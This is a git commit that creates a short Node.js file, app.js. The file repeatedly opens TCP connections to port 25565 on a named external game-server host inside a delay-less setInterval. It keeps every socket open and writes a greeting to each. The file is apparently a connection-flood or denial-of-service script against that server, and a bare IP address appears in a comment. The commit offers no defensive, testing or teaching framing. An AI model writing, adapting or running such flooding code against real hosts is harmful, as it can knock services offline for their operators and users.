a40bc19ed355bdb03e597122f61dd3cf5da7266b
jerzyabdullatif <77098491+jerzyabdullatif@users.noreply.github.com>
2021-01-07 12:19:14 +0300

    Create app.js

---
+++ app.js
@@ -0,0 +1,21 @@
+//93.162.69.98
+
+var net = require('net');
+
+const fn = () => {
+
+const ss = []
+setInterval(() => {
+    var client = new net.Socket();
+    client.connect(25565, 'beratbadat.aternost.me', function() {
+        // console.log('Connected');
+        client.write('Hello, server! Love, Client.');
+    });
+
+    ss.push(client)
+
+})
+
+}
+
+
